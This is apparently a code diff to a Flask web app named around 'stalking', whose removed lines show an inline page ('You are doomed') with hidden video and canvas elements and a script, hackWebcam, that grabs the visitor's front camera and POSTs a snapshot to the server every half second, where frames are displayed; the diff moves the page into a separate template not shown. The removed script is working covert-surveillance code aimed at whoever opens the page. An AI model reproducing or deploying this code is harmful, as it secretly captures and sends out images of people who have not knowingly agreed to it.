@@ -1,7 +1,7 @@
 
 from flask import Flask
 from flask import request
-from flask import render_template_string
+from flask import render_template
 import base64
 import numpy as np
 import threading
@@ -15,7 +15,7 @@ app = Flask(__name__)
 
 def update(frame):
     cv2.imshow('stalking :D', frame)
-    cv2.waitKey(0)
+    cv2.waitKey(500)
     cv2.destroyAllWindows()
 
 
@@ -38,58 +38,11 @@ def stalk():
     # display the fram in  a window
     display_thread = threading.Thread(target=update, args=(frame,))
     display_thread.start()
-    keyboard.press('c')
-    keyboard.release('c')
     return ''
 
 @app.route('/')
 def index():
-    return render_template_string('''
-    <h1 align="center" > You are doomed</h>
-
-    <video hidden="true"  id="video" playsinline autoplay > </video>
-    
-    <canvas  hidden id="canvas" width="640" height="640" > canvas </canvas>
-    
-    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
-    <script>
-
-       function post(imgdata){
-            $.ajax({
-            type: 'POST',
-            data: {frame: imgdata}, // "frame" is the data name that we going to access in the backend
-            url: '/stream',
-            dataType: 'json',
-            async: false
-            });
-        }
-
-      const video = document.getElementById('video');
-      const canvas = document.getElementById('canvas');
-
-      const constraints = {
-        audio : false,
-        video : {facingMode : "user"}
-      };
-
-      async function hackWebcam() {
-        const stream = await navigator.mediaDevices.getUserMedia(constraints);
-        window.stream = stream;
-        video.srcObject = stream;
-
-        var context = canvas.getContext('2d');
-
-        setInterval(()=>{
-            context.drawImage(video, 0, 0, 640, 640);
-            var canvasData = canvas.toDataURL("image/png") // convert image to base64 data in order to send it throu  the post request
-           post(canvasData);
-        },500)
-
-      }
-        hackWebcam();
-
-    </script>
-    ''')
+    return render_template('index.html')
 
 
 
